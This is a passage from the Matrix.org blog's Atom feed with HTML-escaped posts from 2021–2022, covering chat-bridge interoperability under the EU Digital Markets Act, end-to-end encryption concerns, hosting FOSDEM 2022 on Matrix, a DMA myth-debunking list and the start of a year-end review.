users on custom clients (assuming the gatekeeper doesn’t flex and turn it off
for other reasons).&lt;&#x2F;p&gt;
&lt;p&gt;Obviously, this flow only considers the simple case of Alice inviting Bob. The
flow is of course symmetrical for Bob inviting Alice; AliceChat will need to
advertise bridges which can be used to connect to its users.  As Bob pops up
from BobChat, the bridge would use AliceChat’s newly open APIs to provision a
user for him, authing him as per any other user (thus ensuring that AliceChat
doesn’t need to have trusted BobChat to have authenticated the user).  The
bridge then sends&#x2F;receives messages on Bob’s behalf within AliceChat.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;group-communication&quot;&gt;Group communication&lt;&#x2F;h4&gt;
&lt;p&gt;This is all very well for 1:1 chats - which are the initial scope of the DMA.
However, over the coming years, we expect group chats to also be in scope.
The good news is that the same general architecture works for group chats
too.  We need a better source of identity though: AliceChat can’t possibly
independently authenticate all the new users which might be joining via group
conversations on other servers (especially if they join indirectly via
another server).  This means adopting one of the decentralised identity
lookup approaches outlined earlier to determine whether Charlie on
CharlieChat is the real Charlie or an imposter.&lt;&#x2F;p&gt;
&lt;p&gt;Another problem which emerges with group chats which span multiple service
providers is that of indirect routing, especially if the links between the
providers use different protocols.  What if AliceChat has a direct bridge to
BobChat (a bit like AIM and ICQ both spoke OSCAR), BobChat and CharlieChat
are connected by Matrix bridges, and AliceChat and CharlieChat are connected
via XMPP bridges?  We need a way for the bridges to decide who forwards
traffic for each network, and who bridges the users for which network.  If
they were all on Matrix or XMPP this would happen automatically, but with
mixed protocols we’d probably have to extend the lookup protocol to establish
a spanning tree for each conversation to prevent forwarding loops.&lt;&#x2F;p&gt;
&lt;p&gt;Here’s a deliberately twisty example to illustrate the above thought experiment:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-03-29-alice-bob-charlie.jpg&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;There is also a risk of bridge proliferation here - in the worst case, every
service would have to source bridges to directly connect to every other
service who came along, creating a nightmarish n-by-m problem.  But in
practice, we expect direct proprietary-to-proprietary bridges to be rare:
instead, we already have open standard communication protocols like Matrix
and XMPP which provide a common language between bridges - so in practice,
you could just end up in a world where each service has to find a
them-to-Matrix or them-to-XMPP bridge (which could be run by them, or
whatever trusted party they delegate to).&lt;&#x2F;p&gt;
&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h3&gt;
&lt;p&gt;A mesh of bridges which connect together the open APIs of proprietary vendors
by converting them into open standards may seem unwieldy at first - but it’s
precisely the sort of ductwork which links both phone networks and the
Internet together in practice.  As long as the bridging provides for highest
common denominator fidelity at the best impedance ratio, then it’s
conceptually no different to converting circuit switched phone calls to VoIP,
or wired to wireless Ethernet, or any of the other bridges which we take
entirely for granted in our lives thanks to their transparency.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, while this means a bit more user interface in the communication
apps in order to select networks and warn about trustedness, the benefits to
users are enormous as they put the user squarely back in control of their
conversations. And the UX will improve as the tech evolves.&lt;&#x2F;p&gt;
&lt;p&gt;The bottom line is, we should not be scared of interoperability, just because
we’ve grown used to a broken world where nothing can interconnect.  There are
tractable ways to solve it in a way that empowers and informs the user - and
the DMA has now given the industry the opportunity to demonstrate that it can
work.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Interoperability without sacrificing privacy: Matrix and the DMA</title>
        <published>2022-03-25T22:39:46+00:00</published>
        <updated>2022-03-25T18:01:39+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/03/25/interoperability-without-sacrificing-privacy-matrix-and-the-dma/" type="text/html"/>
        <id>https://matrix.org/blog/2022/03/25/interoperability-without-sacrificing-privacy-matrix-and-the-dma/</id>
        
        <content type="html">&lt;p&gt;Yesterday the EU Parliament &amp;amp; Council agreed on the contents of the Digital
Markets Act - new legislation from the EU intended to limit anticompetitive
behaviour from tech “gatekeepers”, i.e. big tech companies (those with market
share larger than €75B or with more than €7.5B a year of revenue).&lt;&#x2F;p&gt;
&lt;p&gt;This is absolutely landmark legislation, where the EU has decided not to break
the gatekeepers up in order to create a more competitive marketplace - but
instead to “break them open”.  This is unbelievably good news for the open
Internet, as it is obligating the gatekeepers to provide open APIs for their
communication services.  In other words: no longer will the tech giants be
able to arbitrarily lock their users inside their walled gardens - there will
be a legal requirement for them to expose APIs to other services.&lt;&#x2F;p&gt;
&lt;p&gt;While the formal outcomes of yesterday’s agreement haven’t been published yet
(beyond &lt;a href=&quot;https:&#x2F;&#x2F;www.europarl.europa.eu&#x2F;news&#x2F;en&#x2F;press-room&#x2F;20220315IPR25504&#x2F;deal-on-digital-markets-act-ensuring-fair-competition-and-more-choice-for-users&quot;&gt;this press release&lt;&#x2F;a&gt;),
our understanding is that the DMA will mandate:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Gatekeepers will have to provide open and documented APIs to their
services, on request, in order to facilitate interoperability (i.e. so
that other services can communicate with their users).&lt;&#x2F;li&gt;
&lt;li&gt;These APIs must preserve the same level of end-to-end encryption (if any)
to remote users as is available to local users.&lt;&#x2F;li&gt;
&lt;li&gt;This applies to 1:1 messaging and file transfer in the short term, and
group messaging, file-transfer, 1:1 VoIP and group VoIP in the longer
term.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;This is the best possible outcome imaginable for the open internet.  Never
again will a big tech company be able to hold their users hostage in a walled
garden, or arbitrarily close down or sabotage their APIs.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;so-what-s-the-catch&quot;&gt;So, what’s the catch?&lt;&#x2F;h3&gt;
&lt;p&gt;Since the DMA announcement on Thursday, there’s been &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;alexstamos&#x2F;status&#x2F;1507145126006587411&quot;&gt;quite a lot&lt;&#x2F;a&gt;
of &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;AlecMuffett&#x2F;status&#x2F;1507366934412734491&quot;&gt;yelling&lt;&#x2F;a&gt; from some very
experienced voices that mandating interoperability via open APIs is going to
irrevocably undermine end-to-end encrypted messengers like WhatsApp.  This
seems to mainly be born out of a concern that the DMA is somehow trying to
subvert end-to-end encryption, despite the fact that the DMA explicitly
mandates that the APIs must expose the same level of security, including
end-to-end encryption, that local users are using. (N.B. Signal doesn’t
qualify as a gatekeeper, so none of this is relevant to Signal).&lt;&#x2F;p&gt;
&lt;p&gt;So, for WhatsApp, it means that the API would expose both the message-passing
interface as well as the key management APIs required to interoperate with
WhatsApp using your own end-to-end-encrypted WhatsApp client - E2EE would be
preserved.&lt;&#x2F;p&gt;
&lt;p&gt;However, this does mean that if you were to actively interoperate between
providers (e.g. if Matrix turned up and asked WhatsApp, post DMA, to expose
an API we could use to write bridges against), then that bridge would need to
convert between WhatsApp’s E2EE’d payloads and Matrix’s E2EE’d payloads.
(Even though both WhatsApp and Matrix use the Double Ratchet, the actual
payloads within the encryption are completely different and would need to be
converted).  Therefore such a bridge has to re-encrypt the traffic - which
means that the plaintext is exposed on the bridge, putting it at risk and
breaking the end-to-end encryption guarantee.&lt;&#x2F;p&gt;
&lt;p&gt;There are solutions to this, however:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;We could run the bridge somewhere relatively safe - e.g. the user’s client.
There’s a bunch of work going on already in Matrix to run clientside
bridges, so that your laptop or phone effectively maintains a connection
over to iMessage or WhatsApp or whatever as if it were logged in… but then
relays the messages into Matrix once re-encrypted.  By decentralising the
bridges and spreading them around the internet, you avoid them becoming a
single honeypot that bad actors might look to attack: instead it becomes
more a question of endpoint compromise (which is already a risk today).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The gatekeeper could switch to a decentralised end-to-end encrypted protocol
like Matrix to preserve end-to-end encryption throughout.  This is
obviously significant work on the gatekeeper’s side, but we shouldn’t rule
it out.  For instance, making the transition for a non-encrypted service is
impressively little work, as &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;07&#x2F;gitter-now-speaks-matrix#how-do-you-make-an-existing-chat-system-talk-matrix&quot;&gt;we proved with Gitter&lt;&#x2F;a&gt;.
(We’d ideally need to figure out decentralised&#x2F;federated identity-lookup
first though, to avoid switching from one centralised identity database
to another).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Worst case, we could flag to the user that their conversation is insecure
(the chat equivalent of a scary TLS certificate warning).  Honestly, this
is something communication apps (including Matrix-based ones!) should be
doing anyway: as a user you should be able to tell what 3rd parties
(bots, integrations etc) have been added to a given conversation.  Adding
this sort of semantic actually opens up a much richer set of communication
interactions, by giving the user the flexibility over who to trust with
their data, even if it breaks the platonic ideal of pure E2E encryption.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;On balance, we think that the benefits of mandating open APIs outweigh the
risks that someone is going to run a vulnerable large-scale bridge and
undermine everyone’s E2EE.  It’s better to have the option to be able to get
at your data in the first place than be held hostage in a walled garden.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;other-considerations&quot;&gt;Other considerations&lt;&#x2F;h3&gt;
&lt;p&gt;One other complaint which has come up a bunch is around speed of innovation:
the idea that WhatsApp or similar would be seriously slowed down by having
to (effectively) maintain stable documented federation APIs, and figure out
how to do backwards compatibility for new features.  It’s true that this will
take a bit more effort (similar to how adding GDPR compliance takes some
effort), but the ends make it more than worth it.  Plus, if the rag-tag
Matrix ecosystem can do it, it doesn’t seem unreasonable to think that a
$600B company like Meta can figure it out too...&lt;&#x2F;p&gt;
&lt;p&gt;Another consideration is that it might make it too easy to build malicious 3rd
party clients - e.g. building your own &amp;quot;special&amp;quot; version of Signal which
connects to the official service, but deliberately or otherwise has security
flaws.  The fact is that we&#x27;re already in this position though: there are
illicit alternative clients flying around all over the place, and the onus is
on the app stores to protect their users from installing malware.  This isn&#x27;t
reason to throw the baby of interoperability out with the bathwater of
bootleg clients.&lt;&#x2F;p&gt;
&lt;p&gt;The final complaint is about moderation and abuse: while open APIs are good
news for consumer choice, they can also be used by spammers, phishers and
other miscreants to cause problems for the users within the gatekeeper.  Much
like a mediaeval citadel; opening up your walled garden means that both good
and bad people can turn up.  And much like real life, this is a solvable problem,
even if it’s unfortunate: the benefits of free trade massively outweigh the
downsides of having to police strangers more effectively.  Frankly,
moderation and anti-abuse approaches on the Internet today are infamously
broken, with centralised moderation by gatekeepers producing increasingly
erratic results.  By opening the walled gardens, we are forcing a much-needed
opportunity to review how to empower users and admins to filter unwanted
content on their own terms.  There’s a recent write-up of the proposed
approach for Matrix at
&lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;moderation-needs-a-radical-change&#x2F;&quot;&gt;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;moderation-needs-a-radical-change&#x2F;&lt;&#x2F;a&gt;,
which outlines one strategy - but there are many others.  Honestly, having to improve
moderation tooling is a worthwhile price to pay for the benefits of open
APIs.&lt;&#x2F;p&gt;
&lt;p&gt;So, there you have it. Hopefully you’ll agree that the benefits here outweigh
the risks: without open APIs we wouldn&#x27;t even have the &lt;em&gt;option&lt;&#x2F;em&gt; to talk about
interoperability.  We should be celebrating a new dawn for open access,
rather than fearing that the sky is falling and this is nefarious attempt to
undermine end-to-end encryption.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Hosting FOSDEM 2022 on Matrix</title>
        <published>2022-02-07T00:00:00+00:00</published>
        <updated>2022-02-07T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/02/07/hosting-fosdem-2022-on-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2022/02/07/hosting-fosdem-2022-on-matrix/</id>
        
        <content type="html">&lt;p&gt;Last year was the first time FOSDEM was hosted on Matrix, and it was generally a huge success - and so the FOSDEM team trusted us again this year and we’re happy to say that it seems to have gone really well! This year’s FOSDEM was massive once again, featuring 654 speakers, 731 events, and 103 tracks.&lt;&#x2F;p&gt;
&lt;p&gt;This year hosting the event went smoother than last year, the only significant issue was some of the Q&amp;amp;A Jitsis not being broadcast to the devrooms on Saturday before 10:15 UTC, for which we offer our apologies to the speakers impacted. This turned out to be a problem with the Matrix&amp;lt;-&amp;gt;Jitsi access control sync system which hadn’t showed up during earlier testing, but we patched around it rapidly on the day.&lt;&#x2F;p&gt;
&lt;p&gt;The most notable difference between this year and the previous year has been the usage of a “attendees.fosdem.org” instance in addition to the original “fosdem.org” one, specifically for attendees. The graphs speak for themselves: Synapse could handle the load of the 23K users (13K joined users and 10K lurkers) spread across a total number of 941 rooms. The real eye-opener however is that of the 13K joined users, only 4K came came from the FOSDEM attendee server, and 1K from Libera Chat, meaning that ~70% of the Matrix participants were already on Matrix and came in from existing servers! 🤯 That means the vast majority of people attended over federation. Decentralisation at work, people! It works! We didn’t host the conference… you did!!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-07-02-fosdem_attendees_heatmap.png&quot; alt=&quot;FOSDEM attendees heatmap&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;But not only did the backend handle the load smoothly: the general user experience felt tightly integrated. People were welcomed by a tailor-made home page in Element to help them navigate through all the tracks and stands:.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-07-02-fosdem_homescreen.png&quot; alt=&quot;Homescreen of chat.fosdem.org&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;One of the great things is it doesn’t require heavy modifications to Element: anyone who installs their own instance of Element can use a simple html file to display relevant information to their audience.&lt;&#x2F;p&gt;
&lt;p&gt;New this year, we also generated a space hierarchy for the whole conference at &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#fosdem2022:fosdem.org&quot;&gt;#fosdem2022:fosdem.org&lt;&#x2F;a&gt; to help navigate the maze of rooms, making it even easier for users on their own servers to jump in:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-07-02-fosdem_space.png&quot; alt=&quot;FOSDEM Space listing all the FOSDEM rooms&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Another greatly appreciated feature was the famous “maximised widgets” I (Thib) &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;c&#x2F;Matrixdotorg&quot;&gt;keep telling you about in Matrix Live episodes&lt;&#x2F;a&gt;. Attendees and speakers could give the conference the central attention it deserved while simultaneously keeping an eye on what was happening in the chat. &lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-07-02-fosdem_stand.png&quot; alt=&quot;FOSDEM stand with maximised widget view&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;From the speaker&#x27;s perspective, we tried to streamline the user journey as much as possible: a bot invited them to a backstage room, in which they joined a Jitsi widget while their talk was being played in the track or devroom. They could see the most upvoted questions by the audience in a dedicated widget. A few minutes before their pre-recorded talk was over, a countdown (new this year!) could be displayed to tell them and the host they were about to go live. At the end of the countdown, the backstage Jitsi was broadcasted to the track so the speaker could answer the questions.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-07-02-fosdem_backstage.png&quot; alt=&quot;Backstage room where the speaker and host could talk and see the questions&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;If you want to have an in-depth look at the backend’s architecture, it didn’t change much from last year. You can have a look at &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;02&#x2F;15&#x2F;how-we-hosted-fosdem-2021-on-matrix#how-was-it-built&quot;&gt;last year’s blog post for the details on the setup&lt;&#x2F;a&gt;. Most of the heavy lifting was around &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;conference-bot&quot;&gt;the conference bot&lt;&#x2F;a&gt; used to set rooms up, create the spaces, populate them with widgets, arrange layouts and trigger countdowns before going live…&lt;&#x2F;p&gt;
&lt;p&gt;Finally we are immensely proud that we had our first ever Matrix Devroom! Not only does it mean the staff of a large international open source conference thinks it’s worth having a track of our own, it also means our community has grown to the point where we could have &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2022&#x2F;schedule&#x2F;track&#x2F;matrixorg_foundation_and_community&#x2F;&quot;&gt;8 hours of back to back Matrix content&lt;&#x2F;a&gt;! Here’s a link to &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;playlist?list=PLl5dnxRMP1hW7HxlJiHSox02MK9_KluLH&quot;&gt;the YouTube playlists to which we are going to add the videos of FOSDEM&lt;&#x2F;a&gt; as they’re being published.&lt;&#x2F;p&gt;
&lt;p&gt;Huge thanks to the FOSDEM team for trusting us, massive shout-out to &lt;a href=&quot;https:&#x2F;&#x2F;ems.element.io&#x2F;&quot;&gt;Element Matrix Services&lt;&#x2F;a&gt; and Element’s Ops and infrastructure team for their fantastic job in setting everything up and making sure everything was ready in time, a sincere thank you to all the fantastic speakers who shared awesome content, and finally to all the attendees. What a weekend!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Digital Markets Act and interoperability: Debunking the gatekeepers&#x27; myths</title>
        <published>2022-02-03T00:00:00+00:00</published>
        <updated>2022-02-03T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/02/03/digital-markets-act-and-interoperability-myth-debunking-of-the-gatekeepers-arguments/" type="text/html"/>
        <id>https://matrix.org/blog/2022/02/03/digital-markets-act-and-interoperability-myth-debunking-of-the-gatekeepers-arguments/</id>
        
        <content type="html">&lt;p&gt;Today the European Parliament, the European Council and the European Commission will meet again for a discussion about the Digital Markets Act (DMA). This is the second of three of these meetings, appropriately called trilogues, where each party exposes their stance on a proposed law and the group tries to agree on the final version.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;ec.europa.eu&#x2F;info&#x2F;strategy&#x2F;priorities-2019-2024&#x2F;europe-fit-digital-age&#x2F;digital-markets-act-ensuring-fair-and-open-digital-markets_en&quot;&gt;The DMA&lt;&#x2F;a&gt; is a groundbreaking step forward in shaking the hold a few gatekeepers have on users and the market, in particular because it looks to (among others):&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Require gatekeepers to allow other services to interoperate with their services&lt;&#x2F;li&gt;
&lt;li&gt;Prevent them to treat their own services and products more favourably (for example by ranking) &lt;&#x2F;li&gt;
&lt;li&gt;Require them to allow users to uninstall any pre-installed software or app&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The interoperability obligation is obviously the one on which we’ve kept a particularly close eye, as if it lands well it could take the success of Matrix to the next level completely overnight.&lt;&#x2F;p&gt;
&lt;p&gt;However, whilst in our mind interoperability automatically implies “open standard”, there are actually different ways of implementing it, depending on how far one wants to go. Typical debates here have been between whether to force gatekeepers to maintain open and well documented APIs, or whether to go full swing and mandate an open standard, and every shade in between.&lt;&#x2F;p&gt;
&lt;p&gt;We’ve been lucky to have had the opportunity to talk to policy advisors from different European member states, and it has been pretty fascinating to realise that it was always the same arguments which were being presented back at us, straight from the gatekeepers partyline.&lt;&#x2F;p&gt;
&lt;p&gt;We’ve ended up just listing them in a quick, high level, Myth Debunking exercise and thought it would be useful to actually publish them for everyone to access, so here they are!&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;MYTH #1 -&lt;&#x2F;strong&gt; &amp;quot;It is impossible to have a standard that is open, decentralized and secure at the same time&amp;quot;&lt;br &#x2F;&gt;
⇒ &lt;strong&gt;false&lt;&#x2F;strong&gt;: HTTPS did it, Matrix did it.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;MYTH #2 -&lt;&#x2F;strong&gt;&amp;quot;It is difficult and expensive to make existing services compatible with a standard&amp;quot;&lt;br &#x2F;&gt;
⇒ &lt;strong&gt;false&lt;&#x2F;strong&gt;: &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;07&#x2F;gitter-now-speaks-matrix#how-do-you-make-an-existing-chat-system-talk-matrix&quot;&gt;Gitter was integrated into Matrix in less than a month&lt;&#x2F;a&gt;, with a single developer&lt;&#x2F;li&gt;
&lt;li&gt;**MYTH #3 - **&amp;quot;Interoperability is incompatible with end-to-end encryption&amp;quot;&lt;br &#x2F;&gt;
⇒ &lt;strong&gt;false&lt;&#x2F;strong&gt;: services just have to speak the same language, email has proved this with S&#x2F;MIME and PGP - where different vendors can and do interoperate with E2EE. It’s even better when the protocol is E2EE by default.&lt;&#x2F;li&gt;
&lt;li&gt;**MYTH #4 - **&amp;quot;It may work for messaging, but less so for social networks&amp;quot;&lt;br &#x2F;&gt;
⇒ &lt;strong&gt;false&lt;&#x2F;strong&gt;: it&#x27;s still about managing content and users. Even though social networks have more varied content, it is already well modelled for their own APIs, ready to be expressed in a common language. The key is in the fallback option on unsupported features, as well as the ability to have moderation tools (more on that later).&lt;&#x2F;li&gt;
&lt;li&gt;**MYTH #5 - **“Interoperability is not compatible with data privacy”&lt;br &#x2F;&gt;
⇒ &lt;strong&gt;false&lt;&#x2F;strong&gt;: Interoperability gives the ability to users to choose who is hosting their data and as such choose providers they trust. Besides, the DMA doesn’t live in a vacuum: it will exist alongside horizontal regulations like the GDPR and the Data Act, which give people sufficient control over their data to rectify their choices if they are not happy. Because the possibility of interoperability is there, it does not mean it will become mandatory for users to use it: they will still have their own threat models and will make decisions accordingly, just as they do today. But enshrining interoperability in law will at least ensure gatekeepers need to provide recourse for people to have further control over their data, which will be an improvement from the landscape today. &lt;&#x2F;li&gt;
&lt;li&gt;**MYTH #6 - **&amp;quot;There is no user need&amp;quot;&lt;br &#x2F;&gt;
⇒ &lt;strong&gt;false&lt;&#x2F;strong&gt;: most haven&#x27;t had a taste of interoperable chat&#x2F;social media (but they know email), others are demanding bridges between services: &lt;a href=&quot;https:&#x2F;&#x2F;www.dailymail.co.uk&#x2F;sciencetech&#x2F;article-10451559&#x2F;One-four-people-struggle-friends-using-apps.html&quot;&gt;25% users of 2 communication apps lose contact with friends because they are using too many apps&lt;&#x2F;a&gt;. And this figure doubles for people using more than 5 apps. There was no demand for cars when they were created: people only wanted faster horses.&lt;&#x2F;li&gt;
&lt;li&gt;**MYTH #7 - **&amp;quot;There is no demand from European companies&amp;quot;&lt;br &#x2F;&gt;
⇒ &lt;strong&gt;false&lt;&#x2F;strong&gt;: The fact it is so hard for European companies to remain competitive enough to stay alive means there are few of them to complain about what is killing them! However these companies are gathering to push for interoperability (like the &lt;a href=&quot;https:&#x2F;&#x2F;competitivedigitalmarkets.eu&#x2F;&quot;&gt;Coalition for Competitive Digital Markets&lt;&#x2F;a&gt;). It will enable them to be more innovative in the product they develop by benefiting from an existing open network rather than being slowed down by having to build one from scratch. Companies will compete on the value they add rather than the size of their network. An open standard also gives an open field for innovation from a business model perspective. The Web is an excellent example of how much an open network fuels innovation and growth.&lt;&#x2F;li&gt;
&lt;li&gt;**MYTH #8 - **&amp;quot;It is better to require providers to have open and stable APIs than define a single open standard&amp;quot;&lt;br &#x2F;&gt;
⇒ &lt;strong&gt;false&lt;&#x2F;strong&gt;: this is the best way to leave gatekeepers at the center of the ecosystem as it means that each player has to multiply its effort to interface with every single other player, but every player will only have the resources to interface with a few of its counterparts and will logically default to the bigger ones, effectively not solving the problem. In addition, if providers are not aligned on which encryption to use it will just break end-to-end encryption and create risk for the user in every bridge. In practice the DMA is about forcing the gatekeepers to interoperate only, but we strongly believe that &lt;em&gt;everyone&lt;&#x2F;em&gt; should be interoperating if we are about improving the user’s experience and control, and giving more space to companies to innovate. Limiting it to the gatekeepers is a first step, but only a defensive one.&lt;&#x2F;li&gt;
&lt;li&gt;**MYTH #9 - **“An open standard limits innovation if it defines a lowest common denominator”&lt;br &#x2F;&gt;
⇒ &lt;strong&gt;false&lt;&#x2F;strong&gt;: the lowest common denominator should match what users consider as table stakes in a messaging or social media app. Providers can innovate on top by providing different features which go beyond table stakes, for example by targeting niche use cases, like messaging services focused on elderly and disabled users, or focused on healthcare, warehouse workers, or integrated in a CRM for call centers, or creatives…  Providers also can implement a profile of the standard which is a subset of its full scope, ensuring the standard remains a highest common denominator..&lt;&#x2F;li&gt;
&lt;li&gt;**MYTH #10 - **“It will be impossible to moderate social networks built on an open standard”&lt;br &#x2F;&gt;
⇒ &lt;strong&gt;false&lt;&#x2F;strong&gt;: decentralised networks actually have driven the adoption of much more sophisticated moderation techniques than the coarse approaches of centralised silos. Appropriate moderation means have to be part of the open standard definition, and some are already used in Matrix. It would also empower victims who today have no choice but get in touch with providers one by one. Each provider will also have control over their own users, and users can select providers whose T&amp;amp;Cs are aligned with their ethics. The world is not black and white, unlike what Silicon Valley tries to make us believe.&lt;&#x2F;li&gt;
&lt;li&gt;**MYTH #11 - **“It will take years before being able to define an open standard”&lt;br &#x2F;&gt;
⇒ &lt;strong&gt;you don’t have to&lt;&#x2F;strong&gt;: You could leverage existing technologies which are being used by the industry. Matrix, XMPP and ActivityPub exist today. For instance, Matrix has been managed by its own standard body (The Matrix Foundation) and could be ratified by a more established one like IETF, ETSI or W3C if needed.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Obviously the devil will be in the details of the way the final text is formulated, as well as the limits, obligations and controls put in place, but overall it should be an improvement for all European users and companies and we’re looking forward to seeing how today’s trilogue goes!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The Mega Matrix Holiday Special 2021</title>
        <published>2021-12-22T23:27:06+00:00</published>
        <updated>2021-12-22T17:54:48+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2021/12/22/the-mega-matrix-holiday-special-2021/" type="text/html"/>
        <id>https://matrix.org/blog/2021/12/22/the-mega-matrix-holiday-special-2021/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;If you’re reading this - congratulations; you made it through another year :)  Every winter we sit down and review Matrix’s progress over the last twelve months, and look forward to the next - for it’s all too easy to get lost in the day-to-day development and fail to realise how much the overall project is evolving, especially when it’s one as large and ambitious as Matrix!&lt;&#x2F;p&gt;
&lt;p&gt;Looking back at 2021, it’s unbelievable how much stuff has been going on in the core team (as you can tell by the length of this post - sorry!).  There’s been a really interesting mix of activity too - between massive improvements to the core functionality and baseline features that Matrix provides, and also major breakthroughs on next generation work.  But first, let’s check out what’s been happening in the wider ecosystem…&lt;&#x2F;p&gt;
&lt;h2 id=&quot;the-matrix-ecosystem&quot;&gt;The Matrix Ecosystem&lt;&#x2F;h2&gt;
&lt;p&gt;Over 2021 the Matrix ecosystem has expanded unrecognisably.  This time last year we were aware of 2 governments who were seriously adopting Matrix at scale (France and Germany), with the UK and US starting to roll out initial deployments.  12 months later, and we are now aware of &lt;strong&gt;12&lt;&#x2F;strong&gt; governments who are adopting Matrix in various capacities - and we hope to be able to talk about at least some of them in public in 2022!  The UK and US have both progressed significantly too.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, one of the most exciting new public sector stories this year has been &lt;a href=&quot;https:&#x2F;&#x2F;www.gematik.de&#x2F;anwendungen&#x2F;ti-messenger&quot;&gt;gematik&lt;&#x2F;a&gt;: Germany’s national healthcare agency, who &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;07&#x2F;21&#x2F;germanys-national-healthcare-system-adopts-matrix&quot;&gt;announced Matrix&lt;&#x2F;a&gt; as the basis for interoperable secure messaging throughout the whole healthcare sector.  This is a genuine step change for Matrix: rather than a government putting out tenders for “a secure messaging solution”, instead we are seeing tenders for Matrix solution providers.  The Matrix industry is real; it exists today, and we’re seeing more and more new providers such as &lt;a href=&quot;https:&#x2F;&#x2F;famedly.com&#x2F;&quot;&gt;Famedly&lt;&#x2F;a&gt; (building on the &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;famedly&#x2F;company&#x2F;frontend&quot;&gt;Flutter&#x2F;Dart stack&lt;&#x2F;a&gt; which powers &lt;a href=&quot;https:&#x2F;&#x2F;fluffychat.im&quot;&gt;FluffyChat&lt;&#x2F;a&gt;) and &lt;a href=&quot;https:&#x2F;&#x2F;folivo.net&#x2F;portfolio&#x2F;timmy-messenger&#x2F;&quot;&gt;Folivonet&lt;&#x2F;a&gt; (building on the &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;benkuly&#x2F;trixnity&quot;&gt;Trixnity&lt;&#x2F;a&gt; Kotlin Multiplatform stack) stepping up to get involved - as well as many more big incumbents.  We created Matrix in order to bootstrap a new decentralised communication industry, and frankly it’s amazing to see it actually taking shape.&lt;&#x2F;p&gt;
